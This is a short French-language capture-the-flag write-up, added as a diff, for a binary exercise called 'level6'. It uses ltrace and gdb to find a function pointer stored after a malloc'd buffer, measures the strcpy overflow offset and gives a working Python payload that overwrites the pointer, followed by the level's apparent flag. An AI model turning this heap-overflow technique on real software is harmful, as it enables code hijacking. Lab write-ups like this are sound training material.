@@ -1,0 +1,28 @@
+malloc sur pointeur de fonction, qu'on override (voir schema)
+
+ltrace ./level6 lol
+malloc(64)					= 0x0804a008
+malloc(4)					= 0x0804a050
+strcpy(0x0804a008, "lol")	= 0x0804a008
+
+l'adresse de la fonction <m> est stockee dans $eax:
+	0x080484a5 <+41>:    mov    $0x8048468,%edx		; adresse de m
+	0x080484aa <+46>:    mov    0x18(%esp),%eax		; adresse du pointeur sur fonction
+	0x080484ae <+50>:    mov    %edx,(%eax)			; <-- stockee ici
+
+	(gdb) b * 0x080484ae
+	Breakpoint 2 at 0x80484ae
+	(gdb) c
+	Continuing.
+	(gdb) i r
+	eax            0x804a050
+
+On test l'overflow de strcpy jusqu'a avoir un segfault:
+	$ ./level6 `/usr/bin/python -c 'print "A"*71'`
+	Nope
+	$ ./level6 `/usr/bin/python -c 'print "A"*72'`
+	Segmentation fault (core dumped)
+
+On override ce pointeur qui se trouve juste apres dans la memoire:
+	$ ./level6 `python -c 'print "A"*72 + "\x54\x84\x04\x08"'`
+	f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
